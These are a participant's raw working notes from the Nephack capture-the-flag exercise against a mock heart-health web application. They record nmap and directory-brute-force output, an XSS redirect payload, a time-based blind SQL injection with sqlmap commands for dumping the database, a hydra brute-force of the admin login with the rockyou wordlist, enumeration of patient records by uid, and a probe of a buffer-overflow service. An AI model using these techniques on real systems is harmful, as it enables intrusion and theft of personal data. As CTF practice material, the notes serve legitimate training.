# Nephack CTF

## Notes

```
link nephack.io =>404 when visited from browser
ping goes through
next step is to nmap, maybe webserver is running on different port

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-07 19:01 +0545
Nmap scan report for health.nephack.io (172.67.217.104)
Host is up (0.14s latency).
Other addresses for health.nephack.io (not scanned): 104.27.170.29 104.27.171.29 2606:4700:3037::ac43:d968 2606:4700:3034::681b:ab1d 2606:4700:3034::681b:aa1d
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
443/tcp  open  tcpwrapped
8080/tcp open  tcpwrapped
8443/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|WAP|phone
Running: iPXE 1.X, Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:ipxe:ipxe:1.0.0%2b cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: iPXE 1.0.0+, Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.30 seconds


other addressees
104.27.130.251 172.67.158.79 2606:4700:3036::681b:82fb 2606:4700:3033::681b:83fb 2606:4700:3030::ac43:9e4f

stegosuite gave b64encoded data but i was dumb so i ignored
VjFaV2ExWXlSa2hUYTJ4V1lsUnNUbGxzVWxkak1XdDNXa2M1YUZKdGREVlplazVYWVVaYU5scDZhejA9
which translates to health.nephack.io

dirsearch
[11:58:58] 200 -    8B  - /config.php
[11:59:00] 301 -  194B  - /css  ->  http://health.nephack.io/css/
[11:59:01] 301 -  194B  - /db  ->  http://health.nephack.io/db/
[11:59:01] 403 -  580B  - /db/
[11:59:10] 301 -  194B  - /images  ->  http://health.nephack.io/images/
[11:59:11] 200 -    4KB - /index.php
[11:59:13] 301 -  194B  - /js  ->  http://health.nephack.io/js/

inspect about.php
reference to ctf.php

Puzzle Pieces:
---------------------
tos.php
config.php
./result_files/application-07b7790d9aebf9f2b11dc27c84ec4f50.css
<!-- This application is made by @dr.jackal  -->
ip address field
<!-- <input id="total-chol" name="total-chol" type="number" placeholder="130-320" class="form-control input-md" data-range="[130, 320]" required="required"> -->
<!-- This is used to compare the total chalestrol with the db  -->
<!-- Totlal Chalestrol = $total_chalostro -->
float(51) 51 in result3.php response
fieldname and ids are mixedup

xss possible age, HDL, systolic blood pressure, diastolic BP, age field 5, 9, 8, 10, 5

FFUF
------------
index.php               [Status: 200, Size: 4125, Words: 896, Lines: 125]
config.php              [Status: 200, Size: 8, Words: 1, Lines: 5]
footer.php              [Status: 200, Size: 777, Words: 35, Lines: 9]
about.php               [Status: 200, Size: 4999, Words: 1054, Lines: 133]
nav.php
flag => WORKS: gives a link to youtube video
```

Input sent in result page:
Age
HDL
Systotic
Diastolic
Diabetes
Smoking

Fuzzing
Name: aaaaaaaaaa<script>document.location='http://10.9.18.129'</script>

URL: /%00 => gives bad request

SQLMAP on hidden input field:
sqlmap -r request.txt -p total-chol => not vulnerable

_But age field might be vulnerable to timebased attack_
Parameter: age (POST) │
Type: AND/OR time-based blind │
Title: MySQL >= 5.0.12 AND time-based blind │
Payload: total-chol=120&name=Abc&email=nikeshmhr@wearehackerone.com&ip_address=104.27.130.251&address│
=address&age=20' AND SLEEP(5) AND 'oPgV'='oPgV&gender=1&trigly=150&l_d_lip=100&hdl_cholesterol=20&sys_blo│
od_pressue=90&d_blood_pressure=30&smoker=1&diabetes=1

## More attacks:S

sqlmap -r request.txt -p age --current-db
=> heart

sqlmap -r request.txt -p age -D heart --tables

```
[10 tables]
+-------------+
| table 9     |
| admin       |
| calc        |
| calc_value  |
| predication |
| products    |
| res         |
| result      |
| sales_stats |
| users       |
+-------------+
```

sqlmap -r request.txt -p age -D heart -T admin --columns # Need to do this for all tables

list column names => --columns
list no of rows => --count
list column names to dump -C a,b
dump --dump

sqlmap -r request.txt -p age -D heart --fingerprint

3334343434343434334
4433433343434343434333

33343434343434343344433433343434343434333

## dirsearch /

```
[21:47:33] 301 - 194B - /images -> http://health.nephack.io/images/
[21:47:40] 301 - 194B - /css -> http://health.nephack.io/css/
[21:47:44] 301 - 194B - /db -> http://health.nephack.io/db/
[21:47:45] 301 - 194B - /js -> http://health.nephack.io/js/
[21:47:55] 200 - 44B - /flag
[21:55:57] 200 - 4KB - /
[22:03:27] 301 - 194B - /system-management -> http://health.nephack.io/system-management/
```

## dirsearch /system-management

/admin => login page found

Bruteforcing /admin/index.php login page

hydra -l admin -P /media/nikesh/HDD/Security/wordlist/rockyou.txt health.nephack.io http-post-form "/system-management/admin/index.php:username=^USER^&password=^PASS^:sign in now" -V -f

Issue with bruteforce (false positive)
Fix failed message to <script>window.location.href='index.php'</script>

dirsearch with Common-PHP-Filenames found:
/logout.php

dirsearch with -f switch to force extension

```
[00:04:37] 200 -    2KB - /system-management/admin/index.php
[00:04:52] 403 -  580B  - /system-management/admin/assets/
[00:05:03] 500 -    0B  - /system-management/admin/results.php
[00:05:56] 200 -   75B  - /system-management/admin/logout.php
[01:57:18] 200 -    3KB - /system-management/admin/prdetail.php
```

/prdetails.php

<!-- uid=20K+ !-->

gives response from ?uid=27980=> starts here..
27999 => dr. jackal's info?
what to do with it?
42742 => last geniun patients
92340 => last record
31337 => admins info

## nmap ip for admin & jackal (common)

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-11 19:35 +0545
Nmap scan report for nephack.ctf (68.183.95.149)
Host is up (0.096s latency).
Not shown: 996 closed ports
PORT STATE SERVICE
22/tcp open ssh
135/tcp filtered msrpc
139/tcp filtered netbios-ssn
2020/tcp open xinupageserver

enumerating more (-sV -sC)
PORT STATE SERVICE VERSION │
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) │
| ssh-hostkey: │
| 2048 d9:5a:d7:73:3a:cc:fc:49:92:50:41:3f:99:5a:3c:aa (RSA) │
| 256 c8:99:9d:c8:75:30:4d:1d:ce:52:2d:ba:1f:8d:1e:da (ECDSA) │
|\_ 256 0e:f2:e5:30:cb:db:ab:87:40:97:26:ab:03:3a:ce:69 (EdDSA) │
135/tcp filtered msrpc │
139/tcp filtered netbios-ssn │
2020/tcp open xinupageserver? │
| fingerprint-strings: │
| DNSStatusRequest, DNSVersionBindReq, JavaRMI, LANDesk-RC, LDAPBindReq, NCP, NULL, NotesRPC, RPCCheck\$│
SMBProgNeg, TerminalServer, WMSRequest, X11Probe, afp, giop, oracle-tns: │
| Enter password: │
| FourOhFourRequest, SSLSessionReq, TLSSessionReq: │
| Enter password: Buffer overflow detected! <== EXPLOIT THIS?

## TODO

dirsearch /db/
count no. of entries for table result => sqli not possible anymore
how to bypass login?????
http://i.imgbox.com/abmuNQx2 => content hosted in s3 can't access directly requires auth
strange behavior while logging in button name login is required to actually trigger login
ftp 68.183.95.149 2020

nmap -p2020 -sS -sV -O -Pn --script "(ftp\* or banner-plus) and not http-slowloris" --script-args=unsafe=1 68.183.95.149
70K+ scanned

nc host port
aaaaaaaaaaaaaaaaaaaaaaaaaa

128.204.199.209 geniun patients have this ip

Flag format cynical_flag{
